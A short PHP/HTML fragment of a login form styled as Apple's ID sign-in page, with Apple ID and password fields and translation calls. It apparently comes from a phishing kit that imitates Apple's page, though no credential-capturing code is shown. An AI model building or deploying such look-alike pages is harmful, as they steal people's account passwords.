...
<div class="col-xs-12"><span class="LoginTitle"><?=tr('Manage your Apple account Apple ID');?></span> <input class="si-text-field" id="user" name="user" onblur="ChangeBack();" onclick="ChangePlaceholder();" placeholder="Apple ID" spellcheck="false" type="email" required="required"></div>
</div>
<div class="row no-gutter si-field pwd">
<div class="col-xs-12"><label class="LoginTitle" for="pwd"><?=tr('Password');?></label> <input class="si-password si-text-field" id="pass" name="pass" onkeyup="Activate();" placeholder="<?=tr('Password');?>" type="password" required="required">
</div>
</div>
